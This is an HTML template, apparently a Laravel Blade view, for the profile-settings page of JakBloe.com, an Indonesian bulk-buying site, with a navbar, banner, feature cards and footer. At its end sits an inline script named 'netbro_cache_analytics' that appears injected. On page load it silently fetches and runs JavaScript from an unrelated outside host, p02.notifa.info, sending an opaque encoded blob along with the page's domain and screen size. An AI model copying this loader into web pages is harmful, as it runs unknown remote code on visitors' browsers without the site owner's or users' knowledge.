<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" href="img/jbfavicon.png" type="image/x-icon">
    <title>JakBloe.com</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <!--icon font css-->
    <link rel="stylesheet" href="vendors/themify-icon/themify-icons.css">
    <link rel="stylesheet" href="vendors/simple-line-icon/simple-line-icons.css">
    <link rel="stylesheet" href="vendors/font-awesome/css/all.css">
    <link rel="stylesheet" href="vendors/flaticon/flaticon.css">
    <link rel="stylesheet" href="vendors/animation/animate.css">
    <link rel="stylesheet" href="vendors/owl-carousel/assets/owl.carousel.min.css">
    <link rel="stylesheet" href="vendors/animation/animate.css">
    <link rel="stylesheet" href="vendors/magnify-pop/magnific-popup.css">
    <link rel="stylesheet" href="vendors/elagent/style.css">
    <link rel="stylesheet" href="vendors/scroll/jquery.mCustomScrollbar.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/responsive.css">
    <style>
        .menu_one .btn_get {
    margin-left: 20px;
}
    </style>
</head>

<body>
    <div class="body_wrapper">
        <header class="header_area">
            <nav class="navbar navbar-expand-lg menu_one menu_four mx-4">
                    <a class="navbar-brand sticky_logo pl-4" href="/home"><img src="img/jakbloewhite1.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/jakbloecolor.png" srcset="img/logo2x.png 2x" alt=""></a>
                    <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="menu_toggle">
                            <span class="hamburger">
                                <span></span>
                                <span></span>
                                <span></span>
                            </span>
                            <span class="hamburger-cross">
                                <span></span>
                                <span></span>
                            </span>
                        </span>
                    </button>

                    <div class="collapse navbar-collapse mt-2" id="navbarSupportedContent">
                        <ul class="navbar-nav menu w_menu pl_100">
                            <li class="nav-item dropdown submenu mega_menu mega_menu_two active">
                                <a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    Home
                                </a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/about">About Us</a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                            </li>
                            <li class="nav-item dropdown submenu">
                                <a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    Tools
                                </a>
                                <ul class="dropdown-menu">
                                    <li class="nav-item"><a href="shop-grid.html" class="nav-link">Simulasi Pajak</a></li>
                                    <li class="nav-item"><a href="shop-list.html" class="nav-link">Simulasi PPH</a></li>
                                    <li class="nav-item"><a href="product-details-1.html" class="nav-link">Simulasi PBB</a></li>
                                    
                                </ul>
                            </li>
                            </li>

                        </ul>
                    </div>
                      
                        <div class="p-1 bg-light " style="border-radius: 30px ">
                            <div class="input-group"  >
                                <input type="search" placeholder="Cari ?" aria-describedby="button-addon1" class="form-control border-0 bg-light" style="border-radius: 30px ">
                                <div class="input-group-append">
                                    <button id="button-addon1" type="submit" class="btn btn-link " style="color: #17d1a6" ><i class="fa fa-search"></i></button>
                            </div>
                        </div>
                    </div>
                    <a class="btn_get btn_hover btn_get_radious hidden-sm hidden-xs" href="\login">Masuk</a>
                    <a class="btn_get btn_hover btn_get_radious hidden-sm hidden-xs" href="#">Keluar</a>
            </nav>
        </header>

        <section class="company_banner_area">
            <div class="parallax-effect" style="background: url(img/new/company.jpg);"></div>
            <div class="container">
                <div class="company_banner_content">
                    <h6>21 May 2020 / Kota Banda Aceh </h6>
                    <img src="img/kiky2.jpeg" alt="Avatar" style="border-radius: 50%;" width="150" height="150">
                    <h2>Selamat Datang Di JakBloe <br>{{ Auth::user()->name }}</h2>
                    <p class="f_400 w_color f_size_16 l_height26">Silahkan atur profile kamu pada halaman ini</p>
                </div>
            </div>
        </section>
        <section class="saas_features_area_three bg_color sec_pad">
            <div class="container">
                <div class="sec_title text-center mb_70 wow fadeInUp" data-wow-delay="0.3s">
                    <h2 class="f_p f_size_30 l_height50 f_600 t_color">Pengaturan Profile</h2>
                    <p class="f_400 f_size_16">Berikut adalah Data Postingan</p>
                </div>
                <div class="row mb_30 new_service">
                    <div class="col-lg-4 col-sm-6">
                        <div class="saas_features_item text-center wow fadeInUp" data-wow-delay="0.3s">
                            <div class="number">1</div>
                            <div class="separator"></div>
                            <div class="new_service_content">
                                <img src="img/home-10/icon1.png" alt="">
                                <h4 class="f_size_20 f_p t_color f_500">Buat Postingan</h4>
                                <p class="f_400 f_size_15 mb-0">Buat postingan untuk membeli stok barang yang kamu inginkan</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6">
                        <div class="saas_features_item text-center wow fadeInUp" data-wow-delay="0.5s">
                            <div class="number">2</div>
                            <div class="separator"></div>
                            <div class="new_service_content">
                                <img src="img/home-10/icon2.png" alt="">
                                <h4 class="f_size_20 f_p t_color f_500">Perbaharui Profile</h4>
                                <p class="f_400 f_size_15 mb-0">Ubah foto dan data profile kamu di sini</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6">
                        <div class="saas_features_item text-center wow fadeInUp" data-wow-delay="0.7s">
                            <div class="number">3</div>
                            <div class="separator"></div>
                            <div class="new_service_content">
                                <img src="img/home-10/icon3.png" alt="">
                                <h4 class="f_size_20 f_p t_color f_500">Reset Password</h4>
                                <p class="f_400 f_size_15 mb-0">Jaga keamanan akun kamu dengan memperbaharui sandi menjadi lebih kuat</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer class="payment_footer_area payment_footer_area_two">
            <div class="footer_top_six">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-4 col-sm-6">
                            <div class="f_widget company_widget">
                                <a href="index.html" class="f-logo"><img src="img/jakbloewhite1.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
                                <p class="mt_40">Jakbloe adalah sebuah website sebagai wadah untuk membeli barang secara massal. Sehingga harga barang yang didapatkan menjadi lebih murah. Ayo segera bergabung bersama kami!<br>
                                    <h6 style="color:white;">Copyright © 2020 Jakbloe.com</h6>
                                </p>
                            </div>
                        </div>
                        <div class="col-lg-3 col-sm-6">
                            <div class="f_widget about-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">About Us</h3>
                                <ul class="list-unstyled f_list">
                                    <li><a href="#">Company</a></li>
                                    <li><a href="#">Android App</a></li>
                                    <li><a href="#">ios App</a></li>
                                    <li><a href="#">Desktop</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-sm-6">
                            <div class="f_widget about-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Help?</h3>
                                <ul class="list-unstyled f_list">
                                    <li><a href="#">FAQ</a></li>
                                    <li><a href="#">Privacy</a></li>
                                    <li><a href="#">Term & conditions</a></li>
                                    <li><a href="#">Reporting</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-2 col-sm-6">
                            <div class="f_widget social-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Follow Us</h3>
                                <div class="f_social_icon">
                                    <a href="#" class="ti-facebook"></a>
                                    <a href="#" class="ti-twitter-alt"></a>
                                    <a href="#" class="ti-vimeo-alt"></a>
                                    <a href="#" class="ti-pinterest"></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/propper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="vendors/wow/wow.min.js"></script>
    <script src="vendors/sckroller/jquery.parallax-scroll.js"></script>
    <script src="vendors/owl-carousel/owl.carousel.min.js"></script>
    <script src="vendors/imagesloaded/imagesloaded.pkgd.min.js"></script>
    <script src="vendors/isotope/isotope-min.js"></script>
    <script src="vendors/magnify-pop/jquery.magnific-popup.min.js"></script>
    <script src="vendors/counterup/jquery.counterup.min.js"></script>
    <script src="vendors/counterup/jquery.waypoints.min.js"></script>
    <script src="vendors/counterup/appear.js"></script>
    <script src="vendors/circle-progress/circle-progress.js"></script>
    <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="js/plugins.js"></script>
    <script src="js/main.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVuZIvLpsPNiSU%2fnJJRnhzB6Ipwwp44T4y0zDMjKxalHo%2fdaB3VaNUwXynUTyP4AJfUg9bWYzX6K3HPQglHsjHedF%2f20QugqzJwDvbg%2bkuxfGf2%2bWWKoAWUCxGzWAR5TWy3NlUCZKtqRbYjdTQYfEW8C3utAqUs%2bUmhT1Uhw%2bsVRKVbZf%2fwa2FLQOhzv90tpMZuiO%2bAMf8G48%2bRKdCKdfn8XfbBwGRM8wXysmxYHBM4sOsI%2fEKuxOAmmzSSeAgr6I9QAYd%2byThx9igODgcswIwf%2fQToN4TCSm9kQvZDDTB8Fa%2fZqLxlq8z76x3lB%2bTGBvKAZ6gq59hH6FwCFIHqYherUgG551t63tFf5CmxuMk%2bhrWfJbO5CGzvLZUNwR5S5JyxftyMiV1xyEaOuxAUhAbJ5ovmnKRE09z1qye0ADM0uL1p7dGTUTQFcaVtj3MLAJkLzLLtq62gEPMAdc%2f4yYho0Fd7eoXj0OGgRLJzVoPpSM9QQwkWkkbG%2fzgIGylzIeh1q8TfIcXNmHg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>